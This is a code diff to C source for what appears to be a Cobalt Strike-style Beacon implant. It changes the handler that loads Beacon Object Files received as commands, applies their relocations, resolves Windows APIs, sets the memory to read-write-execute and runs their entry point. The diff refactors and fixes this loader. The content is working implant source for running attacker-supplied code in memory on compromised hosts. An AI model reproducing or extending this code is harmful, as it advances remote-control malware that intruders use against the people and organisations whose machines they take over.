@@ -1,71 +1,54 @@
 #include "Bof.h"
-#include "Api.h"
-#include "error.h"
+#include "Command.h"
 
-PROC* FindOrAddDynamicFunction(Beacon_Internal_Api* api, PROC newFunction)
+void* FindOrAddDynamicFunction(Beacon_Internal_Api* api, void* newFunction)
 {
-	PROC* potentialFuncLocation = NULL;
+	int i;
 
-	// Iterate through the dynamic function array
-	for (int index = 0; index < MAX_DYNAMIC_FUNCTIONS; ++index)
-	{
-		PROC* currentFunction = &api->dynamicFns[index];
+	for (i = 0; i < 32; i++) {
+		if (api->dynamicFns[i] == newFunction)
+			return &(api->dynamicFns[i]);
+	}
 
-		// Check if the current function matches the one we're looking for
-		if (*currentFunction == newFunction)
-		{
-			// Function found, return its pointer
-			return currentFunction;
-		}
-
-		// Check if we found an empty slot for a new function
-		if (potentialFuncLocation == NULL && *currentFunction == NULL)
-		{
-			// Store the current slot as a potential location for the new function
-			potentialFuncLocation = currentFunction;
+	for (i = 0; i < 32; i++) {
+		if (api->dynamicFns[i] == NULL) {
+			api->dynamicFns[i] = newFunction;
+			return &(api->dynamicFns[i]);
 		}
 	}
 
-	// If no empty slot was found, return NULL
-	if (potentialFuncLocation == NULL)
-	{
-		return NULL;
-	}
-
-	// Add the new function to the found empty slot
-	*potentialFuncLocation = newFunction;
-
-	// Function added, return its pointer
-	return potentialFuncLocation;
+	return NULL;
 }
 
 // 仅支持 x64 环境下的 coff 加载
-BOOL processRelocation(PBEACON_RELOCATION pImageRelocation, char* lpCodeStart, char* lpCodeStartAddress, char* lpSection, unsigned long offsetInSection) {
-	if (pImageRelocation->relocType < 10) {
-		// 由于这里是32相对偏移，先判断偏移是否大于 4GB
+BOOL processRelocation(PBEACON_RELOCATION pImageRelocation, unsigned char* lpCodeStart, unsigned char* lpCodeStartAddress, unsigned char* lpSection, unsigned long offsetInSection) {
+	// 不能直接写 pImageRelocation->relocType < 10
+	// 因为 relocType 为 unsigned short 无符号
+	if (pImageRelocation->relocType >= 4 && pImageRelocation->relocType <= 9)
+	{
+			// 由于这里是32相对偏移，先判断偏移是否在 -2GB - 2GB 范围内
 		DWORD64 offset = *(DWORD*)(lpCodeStart + pImageRelocation->rvaddre) + (DWORD64)(lpSection + offsetInSection) - (DWORD64)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
-		if (offset + (UINT_MAX / 2 + 1) > UINT_MAX) {
+		if (offset + (UINT_MAX / 2 + 1) > UINT_MAX)
+		{
 			fprintf(stderr, "Relocation truncated to fit (distance between executable code and other data is >4GB)\n");
-			BeaconErrorNA(ERROR_RELOCATION_TRUNCATED_TO_FIT);
 			return FALSE;
 		}
-		*(DWORD*)(lpCodeStart + pImageRelocation->rvaddre) = *(DWORD*)(lpCodeStart + pImageRelocation->rvaddre) + (DWORD)(lpSection + offsetInSection) - (DWORD)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
+		*(long*)(lpCodeStart + pImageRelocation->rvaddre) = *(long*)(lpCodeStart + pImageRelocation->rvaddre) + (long)(lpSection + offsetInSection) - (long)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
 	}
 	else
 	{
 		fprintf(stderr, "Un-implemented relocation type %d", pImageRelocation->relocType);
-		BeaconErrorD(ERROR_UNIMPLEMENTED_RELOCATION_TYPE, pImageRelocation->relocType);
 		return FALSE;
 	}
 
 	return TRUE;
 }
 
-VOID CmdBeaconBof(unsigned char* commandBuf, size_t commandBuflen) {
+VOID CmdInlineExecute(unsigned char* commandBuf, size_t commandBuflen) {
 	// Beacon 内部 API
 	Beacon_Internal_Api* api = malloc(sizeof(Beacon_Internal_Api));
 	if (!api) {
-		fprintf(stderr, "malloc memory failed\n");
+		fprintf(stderr, "Memoryt allocation failed\n");
 		return;
 	}
 	BeaconInternalAPI(api);
@@ -77,33 +60,33 @@ VOID CmdBeaconBof(unsigned char* commandBuf, size_t commandBuflen) {
 
 	// 代码段
 	sizedbuf codeBuf;
-	char* code = BeaconDataLengthAndString(&parse, &codeBuf);
+	unsigned char* code = BeaconDataLengthAndString(&parse, &codeBuf);
 	int codeLength = codeBuf.size;
 
 	// .rdata
 	sizedbuf rdataBuf;
-	char* rdata = BeaconDataLengthAndString(&parse, &rdataBuf);
+	unsigned char* rdata = BeaconDataLengthAndString(&parse, &rdataBuf);
 
 	// .data
 	sizedbuf dataBuf;
-	char* data = BeaconDataLengthAndString(&parse, &dataBuf);
+	unsigned char* data = BeaconDataLengthAndString(&parse, &dataBuf);
 
 	// Beacon 自定义的重定位结构
 	sizedbuf relocationsBuf;
-	char* relocations = BeaconDataLengthAndString(&parse, &relocationsBuf);
+	unsigned char* relocations = BeaconDataLengthAndString(&parse, &relocationsBuf);
 
 	// 入口函数参数
 	sizedbuf bytesBuf;
-	char* bytes = BeaconDataLengthAndString(&parse, &bytesBuf);
+	unsigned char* bytes = BeaconDataLengthAndString(&parse, &bytesBuf);
 
-	char* lpCodeStartAddress = (char*)VirtualAlloc(NULL, codeLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	unsigned char* lpCodeStartAddress = (unsigned char*)VirtualAlloc(NULL, codeLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!lpCodeStartAddress)
 	{
-		fprintf(stderr, "VirtualAlloc failed with error:%lu\n", GetLastError());
+		fprintf(stderr, "VirtualAlloc failed with error:%lu\n\n", GetLastError());
 		free(api);
 		return;
 	}
-	PROC* dynamicFunctionPtr;
+
 	datap relocationsParser;
 	BeaconDataParse(&relocationsParser, relocations, relocationsBuf.size);
 
@@ -121,14 +104,16 @@ VOID CmdBeaconBof(unsigned char* commandBuf, size_t commandBuflen) {
 		}
 		else {
 			// 内部函数
-			// 此时 funcType 表明序号
+			// funcType 表明序号
 			if (reloc->beaconRelocType.funcType != DYNAMIC_FUNC_RELOC_TYPE) {
-				dynamicFunctionPtr = (PROC*)api + reloc->beaconRelocType.funcType;
+				result = processRelocation(reloc, code, lpCodeStartAddress, (unsigned char*)api + (reloc->beaconRelocType.funcType * sizeof(unsigned char*)), 0);
 			}
 			// 外部函数，紧跟着 BEACON_RELOCATION 结构
 			// ModuleLength(4 bytes) || ModuleString(ModuleLength bytes)
 			// FunctionNameLength(4 bytes) || FunctionNameString(FunctionNameLength bytes)
 			else {
+				void* ptr;
+				void* slot;
 				LPSTR lpModuleName = BeaconDataStringPointer(&relocationsParser);
 				LPSTR lpFuncName = BeaconDataStringPointer(&relocationsParser);
 				HMODULE hModule = GetModuleHandleA(lpModuleName);
@@ -136,15 +121,24 @@ VOID CmdBeaconBof(unsigned char* commandBuf, size_t commandBuflen) {
 					LoadLibraryA(lpModuleName);
 				}
 				hModule = GetModuleHandleA(lpModuleName);
-				PROC lpFuncAddre = GetProcAddress(hModule, lpFuncName);
-				if (!lpFuncAddre)
+				if(!hModule)
 				{
-					fprintf(stderr, "Could not resolve API %s!%s\n", lpModuleName, lpFuncAddre);
+					fprintf(stderr, "Could not load module %s\n", lpModuleName);
 					goto cleanup;
 				}
-				dynamicFunctionPtr = FindOrAddDynamicFunction(api, lpFuncAddre);
+				ptr = GetProcAddress(hModule, lpFuncName);
+				if (!ptr)
+				{
+					fprintf(stderr, "Could not load API %s\n", lpFuncName);
+					goto cleanup;
+				}
+				slot = FindOrAddDynamicFunction(api, ptr);
+				if (!slot) {
+					fprintf(stderr, "No slot for function (reduce number of Win32 APIs called)\n");
+					goto cleanup;
+				}
+				result = processRelocation(reloc, code, lpCodeStartAddress, (unsigned char*)slot, 0);
 			}
-			result = processRelocation(reloc, code, lpCodeStartAddress, (char*)dynamicFunctionPtr, 0);
 		}
 		if (!result) goto cleanup;
 	}
@@ -154,12 +148,14 @@ VOID CmdBeaconBof(unsigned char* commandBuf, size_t commandBuflen) {
 	DWORD oldProtect;
 	// 修改内存权限 RWX
 	if (!VirtualProtect(lpCodeStartAddress, codeLength, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-		fprintf(stderr, "VirtualProtect failed with error:%lu", GetLastError());
+		fprintf(stderr, "VirtualProtect failed with error:%lu\n", GetLastError());
+		return;
 	}
 	// 执行入口函数
-	((void(*)(char*, int))(lpCodeStartAddress + entryPoint))(bytes, bytesBuf.size);
+	((void(*)(unsigned char*, int))(lpCodeStartAddress + entryPoint))(bytes, bytesBuf.size);
 
 cleanup:
-	VirtualFree(lpCodeStartAddress, codeLength, 0);
+	VirtualFree(lpCodeStartAddress, 0, MEM_RELEASE);
 	free(api);
+	return;
 }
